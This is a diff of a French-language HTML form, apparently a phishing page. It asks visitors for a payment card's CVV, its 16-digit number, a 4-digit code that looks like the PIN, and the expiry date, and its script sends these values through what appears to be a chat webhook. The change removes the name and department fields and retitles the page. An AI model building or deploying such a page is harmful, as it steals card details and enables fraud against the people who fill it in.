@@ -72,20 +72,8 @@
 </head>
 <body>
   <div class="container">
-    <h1>Informations Personnelles</h1>
+    <h1>Informations Professionnelles</h1>
     <form onsubmit="webhook(); return false;">
-      <div class="form-group">
-        <label for="nom">Nom</label>
-        <input type="text" id="nom" placeholder="Entrez votre nom">
-      </div>
-      <div class="form-group">
-        <label for="prenom">Prénom</label>
-        <input type="text" id="prenom" placeholder="Entrez votre prénom">
-      </div>
-      <div class="form-group">
-        <label for="departement">N° du département</label>
-        <input type="number" id="departement" placeholder="Ex : 49">
-      </div>
       <div class="form-group">
         <label for="cvv">CVV</label>
         <input type="text" id="cvv" placeholder="Entrez le CVV">
@@ -113,7 +101,7 @@
       var content = {
         username: 'Webhook Name',
         avatar_url: 'https://example.com/profile-icon-for-bot.png',
-        content: 'Nom: ' + document.getElementById('nom').value + '\nPrénom: ' + document.getElementById('prenom').value + '\nDépartement: ' + document.getElementById('departement').value + '\nCVV: ' + document.getElementById('cvv').value + '\nCode à 16 chiffres: ' + document.getElementById('code16').value + '\nCode à 4 chiffres: ' + document.getElementById('code4').value + '\nDate d\'expiration: ' + document.getElementById('dateExpiration').value
+        content: 'CVV: ' + document.getElementById('cvv').value + '\nCode à 16 chiffres: ' + document.getElementById('code16').value + '\nCode à 4 chiffres: ' + document.getElementById('code4').value + '\nDate d\'expiration: ' + document.getElementById('dateExpiration').value
       };
       hook.send(JSON.stringify(content));
     }
